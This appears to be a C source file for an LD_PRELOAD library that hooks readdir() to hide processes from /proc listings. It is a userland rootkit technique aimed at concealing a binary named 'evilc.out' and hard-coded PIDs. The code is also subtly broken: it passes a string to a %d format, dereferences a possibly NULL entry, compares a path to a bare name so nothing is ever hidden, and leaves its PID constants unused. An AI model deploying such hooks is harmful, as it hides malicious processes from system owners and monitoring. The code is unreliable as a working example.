#include <error.h>
#include <errno.h>
#include <string.h>
#include <stdio.h>
#include <dirent.h>

#define __USE_GNU
#include <dlfcn.h>
#include <unistd.h>

static struct dirent *(*orig_readdir) (DIR *) = NULL;
static const char* hide_process = "6592";
static const char* hide_process2 = "6204";
static const char* hidde_name = "evilc.out";
//const int pid = getpid();

struct dirent *readdir (DIR * dirp){
   if (orig_readdir == NULL){
      orig_readdir = dlsym (RTLD_NEXT, "readdir");
      if (orig_readdir == NULL)
         error (1, errno, "dlsym");
      fprintf(stderr, "Catched\n");
   }

   struct dirent* ret = orig_readdir(dirp);

   char buffer[256];
   snprintf(buffer,sizeof(buffer),"/proc/%d/cmdline", ret->d_name);

   while (ret != NULL && (strcmp(buffer, hidde_name) == 0)){
      ret = orig_readdir (dirp);
   }
   return ret;

}
